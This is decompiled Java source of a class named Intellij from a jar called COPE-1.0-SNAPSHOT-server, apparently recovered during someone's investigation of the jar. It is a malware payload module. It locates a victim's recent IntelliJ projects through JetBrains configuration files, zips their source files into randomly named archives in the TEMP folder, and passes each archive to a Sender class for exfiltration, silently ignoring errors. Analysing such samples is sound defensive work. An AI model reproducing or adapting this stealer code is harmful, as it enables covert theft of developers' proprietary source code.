/*     */ package idasido.adldaosd.wpiw.payload.impl;
/*     */ 
/*     */ import idasido.adldaosd.wpiw.payload.Payload;
/*     */ import idasido.adldaosd.wpiw.payload.Sender;
/*     */ import idasido.adldaosd.wpiw.util.FileUtil;
/*     */ import java.io.File;
/*     */ import java.io.IOException;
/*     */ import java.nio.file.Files;
/*     */ import java.nio.file.Path;
/*     */ import java.nio.file.Paths;
/*     */ import java.nio.file.attribute.FileAttribute;
/*     */ import java.util.Arrays;
/*     */ import java.util.Scanner;
/*     */ import java.util.zip.ZipEntry;
/*     */ import java.util.zip.ZipOutputStream;
/*     */ 
/*     */ public final class Intellij
/*     */   implements Payload
/*     */ {
/*     */   public void execute() throws Exception {
/*  21 */     String workspaces = getIntellijWorkspaces();
/*  22 */     assert workspaces != null;
/*  23 */     Arrays.<String>stream(workspaces.split("\n"))
/*  24 */       .forEach(s -> {
/*     */           try {
/*     */             File file = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString()); pack(s, file.getPath());
/*     */             Sender.send(file);
/*  28 */           } catch (Exception exception) {}
/*     */         });
/*     */   }
/*     */   
/*     */   private void pack(String sourceDirPath, String zipFilePath) throws IOException {
/*  33 */     Path p = Files.createFile(Paths.get(zipFilePath, new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
/*  34 */     ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p, new java.nio.file.OpenOption[0]));
/*     */     
/*  36 */     try { Path pp = Paths.get(sourceDirPath, new String[0]);
/*  37 */       Files.walk(pp, new java.nio.file.FileVisitOption[0])
/*  38 */         .filter(path -> !Files.isDirectory(path, new java.nio.file.LinkOption[0]))
/*  39 */         .filter(path -> path.toFile().getPath().contains("src"))
/*  40 */         .forEach(path -> {
/*     */             ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
/*     */             
/*     */             try {
/*     */               zs.putNextEntry(zipEntry);
/*     */               
/*     */               Files.copy(path, zs);
/*     */               zs.closeEntry();
/*  48 */             } catch (IOException iOException) {}
/*     */           });
/*  50 */       zs.close(); }
/*     */     catch (Throwable throwable) { try {
/*     */         zs.close();
/*     */       } catch (Throwable throwable1) {
/*     */         throwable.addSuppressed(throwable1);
/*     */       }  throw throwable; }
/*     */      } private String getIntellijWorkspaces() { try {
/*  57 */       File folder = new File(System.getProperty("user.home") + "/AppData/Roaming/JetBrains/");
/*  58 */       if (folder.exists()) {
/*     */         
/*  60 */         StringBuilder sb = new StringBuilder();
/*  61 */         File[] var2 = folder.listFiles();
/*     */         
/*  63 */         assert var2 != null;
/*  64 */         for (File folders : var2) {
/*     */           
/*  66 */           if (folders != null && folders.isDirectory()) {
/*     */             
/*  68 */             File file = new File(folders.getAbsolutePath() + "/options/recentProjects.xml");
/*  69 */             if (file.exists()) {
/*     */               
/*  71 */               Scanner scanner = new Scanner(file, "UTF-8");
/*  72 */               boolean log = false;
/*     */               
/*  74 */               while (scanner.hasNextLine()) {
/*     */                 
/*  76 */                 String line = scanner.nextLine();
/*  77 */                 if (log) {
/*     */                   
/*  79 */                   if (line.contains("</list>")) { log = false; continue; }
/*  80 */                    if (!line.contains("<list>")) {
/*     */                     
/*  82 */                     line = line.substring(line.indexOf("\"") + 1);
/*  83 */                     line = line.substring(0, line.lastIndexOf("/>") - 2);
/*  84 */                     sb.append(line);
/*     */ 
/*     */                     
/*     */                     try {
/*  88 */                       File file1 = new File(line);
/*  89 */                       if (file1.exists()) {
/*     */                         
/*  91 */                         String size = file1.isDirectory() ? getFolderSize(file1) : getFileSize(file1);
/*  92 */                         if (size != null)
/*     */                         {
/*  94 */                           sb.append(" ");
/*  95 */                           sb.append(size);
/*     */                         }
/*     */                       
/*     */                       } 
/*  99 */                     } catch (Exception exception) {}
/*     */ 
/*     */                     
/* 102 */                     sb.append("\n");
/*     */                   }  continue;
/*     */                 } 
/* 105 */                 if (line.contains("<option name=\"recentPaths\">"))
/*     */                 {
/* 107 */                   log = true;
/*     */                 }
/*     */               } 
/*     */               
/* 111 */               scanner.close();
/*     */             } 
/*     */           } 
/*     */         } 
/*     */         
/* 116 */         return sb.toString().replace("$USER_HOME$", System.getProperty("user.home")).replace("/", "\\");
/*     */       } 
/*     */ 
/*     */       
/* 120 */       return null;
/*     */     
/*     */     }
/* 123 */     catch (Exception var13) {
/*     */       
/* 125 */       return null;
/*     */     }  }
/*     */ 
/*     */ 
/*     */   
/*     */   private String getFileSize(File file) {
/* 131 */     long bytes = file.length();
/* 132 */     long kilobytes = bytes / 1024L;
/* 133 */     long megabytes = kilobytes / 1024L;
/* 134 */     if (megabytes > 0L)
/*     */     {
/* 136 */       return String.format("%,d MB", new Object[] { Long.valueOf(megabytes) });
/*     */     }
/*     */ 
/*     */     
/* 140 */     return (kilobytes > 0L) ? String.format("%,d KB", new Object[] { Long.valueOf(kilobytes) }) : String.format("%,d B", new Object[] { Long.valueOf(bytes) });
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   private long getFolderSizeData(File f) {
/* 146 */     long ret = 0L;
/* 147 */     File[] var3 = f.listFiles();
/*     */     
/* 149 */     assert var3 != null;
/* 150 */     for (File file : var3) {
/*     */       
/* 152 */       if (file != null)
/*     */       {
/* 154 */         if (file.isDirectory()) { ret += getFolderSizeData(file); }
/* 155 */         else { ret += file.length(); }
/*     */       
/*     */       }
/*     */     } 
/* 159 */     return ret;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   private String getFolderSize(File folder) {
/*     */     try {
/* 166 */       if (folder != null && folder.isDirectory()) {
/*     */         
/* 168 */         long bytes = getFolderSizeData(folder);
/* 169 */         long kilobytes = bytes / 1024L;
/* 170 */         long megabytes = kilobytes / 1024L;
/* 171 */         if (megabytes > 0L)
/*     */         {
/* 173 */           return String.format("%,d MB", new Object[] { Long.valueOf(megabytes) });
/*     */         }
/*     */ 
/*     */         
/* 177 */         return (kilobytes > 0L) ? String.format("%,d KB", new Object[] { Long.valueOf(kilobytes) }) : String.format("%,d B", new Object[] { Long.valueOf(bytes) });
/*     */       } 
/*     */ 
/*     */ 
/*     */       
/* 182 */       return null;
/*     */     
/*     */     }
/* 185 */     catch (Exception var7) {
/*     */       
/* 187 */       return null;
/*     */     } 
/*     */   }
/*     */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\Intellij.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */